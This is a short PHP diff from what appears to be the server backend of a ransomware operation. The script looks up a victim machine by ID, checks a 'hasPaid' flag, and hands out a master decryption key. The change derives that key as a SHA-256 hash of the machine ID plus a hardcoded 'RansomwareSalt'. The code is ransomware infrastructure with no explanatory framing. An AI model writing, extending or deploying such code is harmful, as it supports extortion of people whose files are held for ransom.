@@ -14,7 +14,9 @@ if (isset($_GET["machineId"]) && !empty(trim($_GET["machineId"]))) {
       $result = mysqli_stmt_get_result($stmt);
       if (mysqli_num_rows($result) >= 1) {
         while ($row = mysqli_fetch_array($result)) {
-          $masterKey = $row['masterKey'];
+          $salt = "R!@RansomwareSalt";
+          $combined = $input_machineId . $salt;
+          $masterKey = hash("sha256", $combined);
           $hasPaid = $row['hasPaid'];
 
           //echo "key: " . $masterKey . " paid: " . $hasPaid;
